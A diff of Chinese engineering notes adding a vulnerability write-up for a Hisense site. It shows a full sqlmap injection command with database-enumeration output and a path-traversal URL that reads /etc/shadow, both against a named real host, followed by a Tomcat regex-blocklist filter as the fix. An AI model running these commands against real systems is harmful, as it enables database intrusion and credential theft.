@@ -1199,17 +1199,6 @@ return NULL;
 发现处于SYN_RCV状态的链接数从100多，快速增加2000左右；
 然后再降到100左右；
 使用tcpdump抓包，发现在突然发送大量的SNDACK包
-10:20:36.586168 IP 123.103.18.129.http-alt > 123.165.208.24.57376: S 111537984:111537984(0) ack 3619930745 win 14480 <mss 1460,sackOK,timestamp 48273825 4294923162,nop,wscale 7>
-10:20:36.586172 IP 123.103.18.129.http-alt > 27.186.199.90.17183: S 55393697:55393697(0) ack 3551054505 win 14480 <mss 1460,sackOK,timestamp 48273825 4294924632,nop,wscale 7>
-10:20:36.586176 IP 123.103.18.129.http-alt > 222.142.248.251.13748: S 2663570460:2663570460(0) ack 516814793 win 14480 <mss 1460,sackOK,timestamp 48273825 4294937831,nop,wscale 7>
-10:20:36.586179 IP 123.103.18.129.http-alt > 223.88.47.191.34532: S 1243551141:1243551141(0) ack 3209509052 win 14480 <mss 1460,sackOK,timestamp 48273825 4294914337,nop,wscale 7>
-10:20:36.586184 IP 123.103.18.129.http-alt > 1.206.58.53.8862: S 2571985368:2571985368(0) ack 88928714 win 14480 <mss 1460,sackOK,timestamp 48273825 4294936780,nop,wscale 7>
-10:20:36.586190 IP 123.103.18.129.http-alt > 223.247.106.96.38126: S 2856521832:2856521832(0) ack 3590760487 win 14480 <mss 1460,sackOK,timestamp 48273825 4294917562,nop,wscale 7>
-10:20:36.586193 IP 123.103.18.129.http-alt > 182.37.59.237.dossier: S 4005109446:4005109446(0) ack 1917750051 win 14480 <mss 1460,sackOK,timestamp 48273825 4294925817,nop,wscale 7>
-10:20:36.586196 IP 123.103.18.129.http-alt > 221.232.39.241.progistics: S 3806352953:3806352953(0) ack 344657780 win 14480 <mss 1460,sackOK,timestamp 48273825 299427,nop,wscale 7>
-10:20:36.586201 IP 123.103.18.129.http-alt > 171.105.41.219.9638: S 2041619521:2041619521(0) ack 663833983 win 14480 <mss 1460,sackOK,timestamp 48273825 3596802,nop,wscale 7>
-10:20:36.586205 IP 123.103.18.129.http-alt > 111.127.6.205.34959: S 1015346154:1015346154(0) ack 664982089 win 14480 <mss 1460,sackOK,timestamp 48273825 3770211,nop,wscale 7>
-10:20:36.586209 IP 123.103.18.129.http-alt > 175.153.198.94.14951: S 2417466839:2417466839(0) ack 1782648372 win 14480 <mss 1460,sackOK,timestamp 48273825 4294913486,nop,wscale 7>
 10:20:36.586213 IP 123.103.18.129.http-alt > 222.75.228.159.43008: S 1555022631:1555022631(0) ack 3268700846 win 14480 <mss 1460,sackOK,timestamp 48273825 7939634,nop,wscale 7>
 10:20:36.586218 IP 123.103.18.129.http-alt > 106.8.166.63.9716: S 3024222476:3024222476(0) ack 3321547315 win 14480 <mss 1460,sackOK,timestamp 48273825 1163946,nop,wscale 7>
 10:20:36.586222 IP 123.103.18.129.http-alt > 115.153.187.40.31183: S 3062004217:3062004217(0) ack 1838085789 win 14480 <mss 1460,sackOK,timestamp 48273825 4294914380,nop,wscale 7>
@@ -1306,3 +1295,142 @@ sec, 3)
   cout << str << endl;
   输出结果为：
   456
+* aaa服务返回结果xml，加入签名后，性能锐减50%
+  加入的签名API有一个锁。
+  而aaa服务启动了几百线程，显然该锁减低了aaa的并发性。
+  而API之所以加锁是由于openssl的加密/解密的api，不是线程安全。
+  后来查资料获取openssl对多线程支持的方法。
+  
+* 海信社区安全漏洞
+1、POST型SQL注入
+    存在SQL注入的站点www.hismarttv.com/ajax/getHotAppList.jspx
+
+使用sqlmap
+./sqlmap.py -u 'http://www.hismarttv.com/ajax/getHotAppList.jspx'  --data 'appId=9000000104031&count=7&deviceCode=&deviceType=003&PageNo=0&t=0.40499216807074845&type=3' --dbs --current-user --current-db
+
+返回：
+#+begin_example
+[14:03:20] [INFO] the back-end DBMS is MySQL
+
+web application technology: JSP, Apache 2.2.15
+back-end DBMS: MySQL 5.0.11
+[14:03:20] [INFO] fetching current user
+[14:03:20] [INFO] retrieved: hitv@%
+current user:    'hitv@%'
+
+[14:03:27] [INFO] fetching current database
+[14:03:27] [INFO] retrieved: asop
+current database:    'asop'
+
+[14:03:35] [INFO] fetching database names
+[14:03:35] [INFO] fetching number of databases
+[14:03:35] [INFO] retrieved: 8
+[14:03:36] [INFO] retrieved: information_schema
+[14:03:55] [INFO] retrieved: asop
+[14:04:00] [INFO] retrieved: backup
+[14:04:08] [INFO] retrieved: hitv
+[14:04:13] [INFO] retrieved: #mysql50#lost+found
+[14:04:34] [INFO] retrieved: mysql
+[14:04:40] [INFO] retrieved: performance_schema
+[14:05:00] [INFO] retrieved: test
+available databases [8]:
+[*] #mysql50#lost+found
+[*] asop
+[*] backup
+[*] hitv
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+#+end_example
+
+2、任意文件下载
+http://www.hismarttv.com/DownloadServlet?contentId=217&downFile=../../../../../../../../../../etc/shadow&fileSize=&flag=1&userName=admin
+可以下载到shadow文件
+
+解决办法：
+我使用tomcat中filter对输入参数进行匹配，发现有sql关键字和符号，返回404错误
+#+begin_src java
+
+import javax.servlet.RequestDispatcher;
+import javax.servlet.ServletException;
+import javax.servlet.http.Cookie;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.io.IOException;
+import java.util.Enumeration;
+
+import javax.servlet.Filter;
+import javax.servlet.FilterChain;
+import javax.servlet.FilterConfig;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.Cookie;
+import javax.servlet.http.HttpServletRequest;
+import java.util.regex.Pattern;
+import java.util.regex.Matcher;
+
+public class CheckFilter implements Filter{
+    FilterConfig fc;
+    public void destroy() {
+
+    }
+  
+    static String reg = "(?:')|(?:--)|(/\\*(?:.|[\\n\\r])*?\\*/)|" 
+        + "\\.\\./|"
+        + "(\\b(select|update|and|or|delete|insert|truncate|char|into|substr|ascii|declare|exec|count|master|into|drop|execute|union)\\b)";  
+  
+    static Pattern sqlPattern = Pattern.compile(reg, Pattern.CASE_INSENSITIVE);  
+  
+    public static boolean isValid(String str) {  
+        if (sqlPattern.matcher(str).find()) {  
+            return false;  
+        }
+        return true;
+    }
+
+    public void doFilter(ServletRequest request, ServletResponse response,
+                         FilterChain chain) throws IOException, ServletException {
+        HttpServletRequest hreq=(HttpServletRequest) request;
+        HttpServletResponse hres=(HttpServletResponse) response;
+        HttpSession session = hreq.getSession();
+        Enumeration paramNames = hreq.getParameterNames();
+
+        while(paramNames.hasMoreElements() ) {
+
+            String paramName = (String)paramNames.nextElement();
+            String[] paramValues = hreq.getParameterValues(paramName);
+            for(int i = 0; i < paramValues.length; i++) {
+               String val = paramValues[i];
+               if(! isValid(val)) {
+                   hres.sendError(HttpServletResponse.SC_NOT_FOUND);
+                   return;
+               }
+            }
+        }
+        chain.doFilter(request, response);
+    }
+    public void init(FilterConfig fc) throws ServletException {
+        this.fc=fc;
+    }
+
+
+}
+#+end_src
+将编译后的CheckFilter.class放到/tomcat/lib/下。
+在web.xml加入：
+ <filter>
+       <filter-name>CheckFilter</filter-name>
+       <filter-class>CheckFilter</filter-class>
+ </filter>
+ <filter-mapping>
+     <filter-name>CheckFilter</filter-name>
+     <url-pattern>/*</url-pattern>
+ </filter-mapping>
+
+重启tomcat后，再使用sqlmap测试，无法进行SQL注入了。well done
+
